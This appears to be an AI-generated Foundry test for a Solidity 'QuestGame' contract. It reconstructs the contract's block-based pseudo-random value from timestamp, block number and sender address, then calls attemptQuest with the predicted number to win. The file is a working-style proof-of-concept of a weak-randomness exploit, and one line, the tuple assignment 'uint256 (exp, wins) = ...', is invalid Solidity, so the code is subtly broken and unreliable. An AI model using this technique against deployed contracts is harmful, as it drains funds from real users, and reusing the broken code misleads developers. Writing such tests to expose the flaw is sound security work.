// Generation Time: 6,94s
// Input Tokens: 3026
// Output Tokens: 348
// Reasoning Tokens: 


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        _contractUnderTest = new QuestGame{value: 10 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockNumber >= block.number);
        vm.assume(type(uint256).max - blockNumber >= blockTimestamp);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    blockTimestamp,
                    blockNumber,
                    address(this)
                )
            )
        );

        uint256 expectedRandom = seed % 100;

        vm.startPrank(address(this));
        _contractUnderTest.attemptQuest{value: 0.1 ether}(expectedRandom);
        vm.stopPrank();

        uint256 (exp, wins) = _contractUnderTest.getPlayerStats(address(this));
        assertEq(exp, 100, "Player should have gained experience");
        assertEq(wins, 1, "Player should have recorded a win");
    }
}
